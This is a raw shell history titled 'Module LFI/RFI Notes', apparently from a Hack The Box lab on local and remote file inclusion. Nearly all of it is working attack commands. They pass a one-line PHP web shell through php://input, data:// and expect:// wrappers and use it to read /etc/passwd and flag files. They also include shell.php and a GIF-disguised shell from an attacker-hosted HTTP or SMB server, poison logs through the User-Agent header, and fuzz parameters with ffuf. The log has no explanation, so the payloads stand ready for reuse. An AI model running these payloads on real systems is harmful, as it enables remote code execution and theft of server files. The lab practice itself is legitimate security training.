#### Module LFI/RFI Notes

```
  870  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  871  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | pwd
  872  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | cat /etc/passwd
  873  clear
  874  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  875  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat /etc/passwd" | grep uid
  876  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat /etc/passwd"
  877  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd"
  878  clear
  879  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  880  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=expect://id"
  881  curl -s "http://94.237.63.93:38592/index.php?language=expect://id"
  882  curl -s "http://94.237.63.93:38592/index.php?language=expect://id"|grep id
  883  clear
  884  curl -s "http://94.237.63.93:38592/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
  885  curl -s "http://94.237.63.93:38592/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id" | grep uid
  886  echo '<?php system($_GET["cmd"]); ?>' | base64
  887  curl -s "http://94.237.63.93:38592/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==cmd=id" | grep uid
  888  curl -s "http://94.237.63.93:38592/index.php?language=data://text/plain;base64,"PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="cmd=id" | grep uid
  889  curl -s "http://94.237.63.93:38592/index.php?language=data://text/plain;base64,"PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8"cmd=id" | grep uid
  890  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  891  clear
  892  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  893  echo '<?php system($_GET["cmd"]); ?>' | base64
  894  curl -s -X POST --data 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  895  curl -s -X POST --data://text/plain;base64, 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==' "http://94.237.63.93:38592/index.php?language=php://input&cmd=id" | grep uid
  896  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=flag.txt" | grep uid
  897  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=flag.txt"
  898  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=flag.txt"|grep HTB
  899  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=flag.txt"|grep -i HTB
  900  clear
  901  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=/flag.txt"|grep -i HTB
  902  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat /flag.txt"|grep -i HTB
  903  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat flag.txt"|grep -i HTB
  904  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=echo x"|grep -i x
  905  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd
"
  906  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat …/…/…/flag.txt"
  907  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../flag.txt"
  908  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../../flag.txt"
  909  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../../../flag.txt"
  910  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../../../../flag.txt"
  911  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../../../../../flag.txt"
  912  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat ../../../../.././flag.txt"
  913  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat .../flag.txt"
  914  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat .../.../flag.txt"
  915  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat .../.../.../flag.txt"
  916  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat .../.../.../.../flag.txt"
  917  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls .../.../.../.../flag.txt"
  918  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls"
  919  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls"|grep flag
  920  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls flag.txt"|grep flag
  921  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ./flag.txt"|grep flag
  922  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ../flag.txt"|grep flag
  923  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ../../flag.txt"|grep flag
  924  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ../../../flag.txt"|grep flag
  925  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ../../../../flag.txt"|grep flag
  926  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ..../flag.txt"|grep flag
  927  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls /flag.txt"|grep flag
  928  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls flag.txt"|grep flag
  929  clear
  930  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls -ltrs"
  931  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls \-ltrs"
  932  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls"
  933  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls *"
  934  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls \*"
  935  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls *.txt"
  936  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls txt"
  937  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd"
  938  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls ../"
  939  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20..%2F"
  940  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20-trs%20%2A.txt"
  941  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20-trs%20%2Froot%2F%2A.txt"
  942  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd"
  943  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd"|grep -5 Containers
  944  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=pwd"|grep -A5 Containers
  945  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A.txt"|grep -A5 Containers
  946  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A"|grep -A5 Containers
  947  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20index.php"
  948  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20en.php"
  949  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20es.php"
  950  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A"|grep -A5 Containers
  951  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20extension.php"
  952  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A"|grep -A5 Containers
  953  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A"|grep -A10 Containers
  954  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20style.css"
  955  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2A"|grep -A10 Containers
  956  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=ls%20%2F"|grep -A10 Containers
  957  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%2037809e2f8952f06139011994726d9ef1.txt"
  958  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:38592/index.php?language=php://input&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1.txt"
  959  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  960  ifconfig -a
  961  http://94.237.63.93:38592/index.php?language=http://10.10.15.41:6969/shell.php&cmd=id
  962  ifconfig -a
  963  http://94.237.63.93:38592/index.php?language=http://10.0.2.15:6969/shell.php&cmd=id
  964  jobs
  965  clear
  966  http://94.237.63.93:38592/index.php?language=http://10.10.15.41:6969/shell.php&cmd=id
  967  curl -s http://94.237.63.93:38592/index.php?language=http://10.10.15.41:6969/shell.php&cmd=id
  968  jobs
  969  fg %1
  970  jobs
  971  curl -s -X POST http://94.237.63.93:38592/index.php?language=http://10.10.15.41:6969/shell.php&cmd=id
  972  ifconfig -a
  973  ufw status
  974  impacket-smbserver
  975  http://94.237.63.93:38592/index.php?language=\\10.10.15.41\share\shell.php&cmd=whoami
  976  http://94.237.63.93:38592/index.php?language=\\10.10.15.41\\share\\shell.php&cmd=whoami
  977  ls
  978  http://94.237.63.93:38592/index.php?language=\\10.10.2.15\\share\\shell.php&cmd=whoami
  979  http://94.237.63.93:38592/index.php?language=\\localhost\\share\\shell.php&cmd=whoami
  980  http://94.237.63.93:38592/index.php?language=\\127.0.0.1\\share\\shell.php&cmd=whoami
  981* http:///index.php?language=\\10.10.15.41\\share\\shell.php&cmd=whoami
  982  clear
  983  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=ls%20%2F"|grep -A10 Containers
  984  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=ls%20%2F"|grep -A20 Containers
  985  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=ls%20%2F"|grep -A25 Containers
  986  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=:cat%20%2Fexercise%2F"|grep -A25 Containers
  987  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd="cat%20%2Fexercise%2F"|grep -A25 Containers
  988  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=cat%20%2Fexercise%2F|grep -A25 Containers
  989  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=cat%20%2Fexercise%2F"|grep -A25 Containers
  990  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=cat%20%2Fexercise"|grep -A25 Containers
  991  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=ls%20%2Fexercise"|grep -A25 Containers
  992  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.129.29.114/index.php?language=php://input&cmd=cat%20%2Fexercise%2Fflag.txt"|grep -A25 Containers
  993  clear
  994  echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
  995  curl -s -X POST --data "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls%20%2Fexercise%2Fflag.txt"|grep -A25 Containers
  996  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls"|grep -A25 Containers
  997  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls"|grep -A25 Containers
  998  clear
  999  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls"|grep -A10 Containers
 1000  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls%20%2F"|grep -A10 Containers
 1001  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls%20%2FGIF82f40d853e2d4768d87da1c81772bae0a.txt"|grep -A10 Containers
 1002  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=cat%20%2FGIF82f40d853e2d4768d87da1c81772bae0a.txt"|grep -A10 Containers
 1003  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls%20%2F"|grep -A25 Containers
 1004  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=cat%20%2FGIF82f40d853e2d4768d87da1c81772bae0a.txt"|grep -A25 Containers
 1005  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=ls%20-trsa%20%2F"|grep -A25 Containers
 1006  curl -s -X POST "http://94.237.63.93:32082/index.php?language=./profile_images/shell.gif&cmd=cat%20%2F2f40d853e2d4768d87da1c81772bae0a.txt"|grep -A25 Containers
 1007  clear
 1008  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.255.150:41954/index.php?language=./profile_images/shell.gif&cmd=ls"|grep -A25 Containers
 1009  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.255.150:41954/index.php?language=php://input&cmd=ls"|grep -A25 Containers
 1010  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.255.150:41954/index.php?language=php://input&cmd=ls%20-trsa%20%2F"|grep -A25 Containers
 1011  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.255.150:41954/index.php?language=php://input&cmd=ls%20-trsa%20%2F"
 1012  clear
 1013  curl -i -v http://83.136.255.150:41954 -A “<?php system('pwd'); ?>”
 1014  curl -i -v http://83.136.255.150:41954 -A "<?php system('pwd'); ?>"
 1015  curl -i -v http://83.136.255.150:41954 -A "<?php system('echo yyyyyyyyyyyyyyyyy'); ?>"
 1016  curl -i -v http://83.136.255.150:41954 -A "<?php system('pwd'); ?>"
 1017  curl -v http://83.136.255.150:41954 -A "<?php system('pwd'); ?>"
 1018  ping 83.136.255.150
 1019  clear
 1020  python3 -m http.server 6969
 1021  history|grep shell.php
 1022  python3 -m http.server 6969
 1023  echo '<?php system($_GET["cmd"]); ?>' \> shell.php
 1024  echo '<?php system($_GET["cmd"]); ?>' \
 1025  clear
 1026  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ'
 1027  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ' -fs 2309
 1028  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php'
 1029  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php' -ffs 2309
 1030  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php' -fs 2309
 1031  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../FUZZ/index.php' -fs 2309
 1032  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../FUZZ/index.php' -fs 2309
 1033  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../FUZZ/index.php' -fs 2309
 1034  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ/index.php' -fs 2309
 1035  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ' -fs 2309
 1036  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ' -fs 2289
 1037  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ' -fs 2287
 1038  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php' -fs 2287
 1039  wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 1040  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php' 
 1041  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?language=../../../../FUZZ/index.php' -fs 2309
 1042  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ/index.php' -fs 2309
 1043  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?language=FUZZ' -fs 2309
 1044  curl -s 'http://94.237.63.83:42175/index.php?language=../../../../etc/apache2/apache2.conf'
 1045  curl -s 'http://94.237.63.83:42175/index.php?language=../../../etc/apache2/apache2.conf'
 1046  curl -s 'http://94.237.63.83:42175/index.php?language=../../etc/apache2/apache2.conf'
 1047  curl -s 'http://94.237.63.83:42175/index.php?language=../etc/apache2/apache2.conf'
 1048  curl -s 'http://94.237.63.83:42175/index.php?language=etc/apache2/apache2.conf'
 1049  curl -s 'http://94.237.63.83:42175/index.php?language=../../../../etc/apache2/envvars'
 1050  curl -s 'http://94.237.63.83:42175/index.php?language=../../../../etc/apache2/envvars' -i
 1051  curl -s 'http://94.237.63.83:42175/index.php?language=../../../../etc/apache2/envvars' -I
 1052  curl -s 'http://94.237.63.83:42175/index.php?language=../../../../etc/apache2/envvars' -i -v
 1053  git clone https://github.com/D35m0nd142/LFISuite.git
 1054  git clone https://github.com/OsandaMalith/LFiFreak.git
 1055  git clone https://github.com/mzfr/liffy.git
 1056  ls -lts
 1057  cd liffy/
 1058  ls -l
 1059  python3 liffy.py 
 1060  python liffy.py 
 1061  pip3 install pyfiglet
 1062  python3 liffy.py 
 1063  python3 liffy.py  http://94.237.63.83:42175/index.php?language=
 1064  python3 liffy.py -d http://94.237.63.83:42175/index.php?language= 
 1065  python3 liffy.py  http://94.237.63.83:42175/index.php?language=
 1066  python3 liffy.py -h 
 1067  python3 liffy.py -ssh http://94.237.63.83:42175/index.php?language=
 1068  python3 liffy.py --ssh http://94.237.63.83:42175/index.php?language=
 1069  curl http://94.237.63.83:42175/index.php?language=…/…/…/…/etc/apache2/envvars
 1070  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?FUZZ=value
'
 1071  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?FUZZ'
 1072  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?FUZZ' -ffs 2309
 1073  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?FUZZ' -fs 2309
 1074  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ'
 1075  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ' -fs 1935
 1076  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ'
 1077  cd ..
 1078  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ'
 1079  ffuf -w LFI-WordList-Linux:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ' -fs 1935
 1080  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ' 
 1081  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.83:42175/index.php?view=FUZZ' -fs 1935
 1082  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/index.php?page=FUZZ'
 1083  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/index.php?page=FUZZ' -fs 4521
 1084  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/index.php?view=FUZZ'
 1085  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/index.php?view=FUZZ' -fs 15829
 1086  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ'
 1087  ffuf -w /opt/repos/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ' -fs 15829
 1088  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ.php'
 1089  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ'
 1090  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ' -fs 15829
 1091  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:54509/dashboard/FUZZ.php' -fs 15829
 1092  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/dashboard/FKK'
 1093  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/dashboard/FKK' -ffs 15829
 1094  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/dashboard/FKK' -fs 15829
 1095  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/FKK'
 1096  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-small-directories.txt:FKK -u 'http://94.237.62.195:54509/FKK' -fs 15829
 1097  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/raft-large-directories.txt:FKK -u 'http://94.237.62.195:54509/FKK' -fs 15829
 1098  wc -l  /opt/repos/SecLists/Discovery/Web-Content/*
 1099  ffuf -w /opt/repos/SecLists/Discovery/Web-Content/combined_directories.txt:FKK -u 'http://94.237.62.195:54509/FKK' -fs 15829
 1100  clear


```